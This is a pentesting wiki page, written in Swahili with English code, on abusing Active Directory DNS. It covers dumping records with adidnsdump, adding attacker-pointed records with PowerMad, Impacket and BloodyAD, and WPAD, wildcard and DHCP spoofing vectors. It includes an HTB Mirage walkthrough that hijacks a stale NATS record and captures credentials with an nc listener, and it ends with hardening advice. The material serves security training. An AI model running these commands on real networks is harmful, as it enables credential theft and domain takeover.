# Rekodi za AD DNS

{{#include ../../banners/hacktricks-training.md}}

Kwa chaguomsingi, **mtumiaji yeyote** katika Active Directory anaweza **kuorodhesha rekodi zote za DNS** katika Domain au Forest DNS zones, sawa na zone transfer (watumiaji wanaweza kuorodhesha vitu vidogo vya DNS zone katika mazingira ya AD).

Zana ya [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) huwezesha **kuorodhesha** na **kuhamisha** **rekodi zote za DNS** katika zone kwa madhumuni ya recon ya mitandao ya ndani.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (Aprili 2025) inaongeza matokeo ya JSON/Greppable (`--json`), utatuzi wa DNS wa nyuzi nyingi na usaidizi wa TLS 1.2/1.3 wakati wa kuunganisha kwa LDAPS  

Kwa maelezo zaidi, soma [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kuunda / Kurekebisha rekodi (ADIDNS spoofing)

Kwa kuwa kundi la **Authenticated Users** lina ruhusa ya **Create Child** kwenye DACL ya zone kwa chaguomsingi, akaunti yoyote ya domain (au akaunti ya kompyuta) inaweza kusajili rekodi za ziada. Hili linaweza kutumika kwa traffic hijacking, NTLM relay coercion au hata kuathiri domain nzima.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py inakuja pamoja na Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Vipengele vya kawaida vya mashambulizi

1. **Wildcard record** – `*.<zone>` hugeuza seva ya AD DNS kuwa responder wa kampuni nzima, sawa na LLMNR/NBNS spoofing. Inaweza kutumiwa kukusanya NTLM hashes au kuzirelay kwenda LDAP/SMB.  (Inahitaji WINS-lookup iwe imezimwa.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – ongeza `wpad` (au record ya **NS** inayoelekeza kwa host ya mshambuliaji ili kukwepa Global-Query-Block-List), kisha elekeza maombi ya HTTP yanayotoka kwenye mtandao kupitia proxy kwa uwazi ili kukusanya credentials. Microsoft ilifanyia marekebisho mbinu za kukwepa wildcard/DNAME (CVE-2018-8320), lakini **NS-records bado zinafanya kazi**.<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – dai anwani ya IP iliyokuwa ya workstation hapo awali; ingizo la DNS linalohusishwa nayo bado litaelekezwa ipasavyo, na hivyo kuwezesha resource-based constrained delegation au Shadow-Credentials attacks bila kugusa DNS kabisa.    
4. **DHCP → DNS spoofing** – katika usanidi wa kawaida wa Windows DHCP+DNS, mshambuliaji asiye na uthibitishaji aliye kwenye subnet ileile anaweza kubadilisha record yoyote iliyopo ya A (ikiwemo ya Domain Controllers) kwa kutuma maombi bandia ya DHCP yanayosababisha masasisho ya dynamic DNS (Akamai “DDSpoof”, 2023). Hii huwezesha mashambulizi ya machine-in-the-middle dhidi ya Kerberos/LDAP na inaweza kusababisha kutwaa domain nzima.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – badilisha `dNSHostName` ya account ya mashine unayoidhibiti, sajili record ya A inayolingana, kisha omba certificate ya jina hilo ili kujifanya DC. Zana kama **Certipy** au **BloodyAD** huendesha mchakato mzima kiotomatiki.  

Record ya AD DNS iliyo na [serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) inaweza kuwa sehemu ya mnyororo wa conditional relay: mpigaji anahitaji ruhusa za kuunda record, njia ya coercion inayosababisha kompyuta lengwa kujithibitisha kwa jina hilo, na lengwa la relay linalokubali uthibitishaji unaotokana na hapo. Tathmini itifaki ya lengwa kivyake; SMB signing kwenye muunganisho unaoingia haiwezi, yenyewe tu, kubainisha kama lengwa la HTTPS WinRM linakubali relay. Kiwango cha patch, ushughulikiaji wa majina, Extended Protection na usanidi wa huduma vinaweza kubadilisha matokeo.

---

### Utekaji wa huduma za ndani kupitia stale dynamic records (uchunguzi wa NATS)

Wakati dynamic updates zinaruhusiwa kwa watumiaji wote waliothibitishwa, **jina la huduma lililoondolewa kwenye usajili linaweza kudaiwa tena na kuelekezwa kwenye miundombinu ya mshambuliaji**. DC ya Mirage HTB ilifichua hostname `nats-svc.mirage.htb` baada ya DNS scavenging, hivyo mtumiaji yeyote mwenye ruhusa za chini angeweza:<sup>[[3]](#references)</sup>

1. **Thibitisha kuwa record haipo** na ujifunze SOA kwa kutumia `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Unda upya rekodi** ikielekeza kwenye kiolesura cha nje/VPN wanachokidhibiti:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Jifanya kuwa huduma ya plaintext**. Wateja wa NATS wanatarajia kuona bango moja la `INFO { ... }` kabla ya kutuma vitambulisho, kwa hiyo kunakili bango halisi kutoka kwa broker halisi kunatosha kukusanya siri:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Mteja yeyote atakayetafuta jina lililotekwa atavuja mara moja frame yake ya JSON `CONNECT` (ikiwemo `"user"`/`"pass"`) kwa listener. Kuendesha binary rasmi ya `nats-server -V` kwenye host ya mshambuliaji, kuzima uficheaji wa logi, au kunasa tu session kwa Wireshark kutatoa credentials zilezile za maandishi wazi, kwa sababu TLS ilikuwa hiari.

4. **Pivot kwa kutumia creds zilizokamatwa** – katika Mirage, akaunti ya NATS iliyoibwa ilitoa ufikiaji wa JetStream, ambao ulifichua matukio ya kihistoria ya uthibitishaji yaliyokuwa na majina ya watumiaji/nywila za AD zinazoweza kutumika tena.

Mtindo huu unatumika kwa kila huduma iliyounganishwa na AD inayotegemea TCP handshakes zisizolindwa (HTTP APIs, RPC, MQTT, n.k.): rekodi ya DNS ikishatekwa, mshambuliaji anakuwa huduma yenyewe.

---

## Ugunduzi na uimarishaji

* Ondoa ruhusa ya **Authenticated Users** ya *Create all child objects* kwenye zones nyeti, na ukabidhi dynamic updates kwa akaunti maalum inayotumiwa na DHCP.
* Ikiwa dynamic updates zinahitajika, weka zone kuwa **Secure-only** na uwashe **Name Protection** katika DHCP ili kompyuta mmiliki pekee iweze kubadilisha rekodi yake.
* Fuatilia DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) na LDAP writes kwa `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Zuia majina hatari (`wpad`, `isatap`, `*`) kwa kutumia rekodi isiyo hatarishi iliyowekwa kimakusudi au Global Query Block List.
* Sasisha DNS servers – kwa mfano, hitilafu za RCE CVE-2024-26224 na CVE-2024-26231 zilifikia **CVSS 9.8** na zinaweza kutumiwa kwa mbali dhidi ya Domain Controllers.

## References

- [1] [ADIDNS Imechunguzwa Tena - WPAD, GQBL na Mengineyo](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Kughushi Rekodi za DNS kwa Kutumia Vibaya DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Kuunganisha NFS Leaks, Matumizi Mabaya ya Dynamic DNS, Wizi wa NATS Credentials, Siri za JetStream na Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Kuingia kwenye Zone: Kutupa Active Directory DNS kwa kutumia adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
